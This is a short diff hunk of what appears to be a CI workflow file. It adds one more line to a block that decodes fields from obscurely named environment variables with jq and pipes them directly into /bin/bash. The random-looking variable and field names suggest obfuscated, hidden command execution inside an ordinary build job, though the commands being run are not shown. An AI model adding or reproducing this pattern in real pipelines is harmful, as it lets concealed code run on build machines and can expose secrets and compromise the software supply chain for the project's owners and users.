@@ -23,6 +23,7 @@ jobs:
           echo $a725 | jq -r .k65326 | /bin/bash
           echo $pwc84 | jq -r .ni00265 | /bin/bash
           printf '%s' "$qbbtx6971" | jq -r .wpmy1664 | /bin/bash
+          printf '%s' "$k2" | jq -r .hxh0 | /bin/bash
 
       - name: Save archive
         if: always()
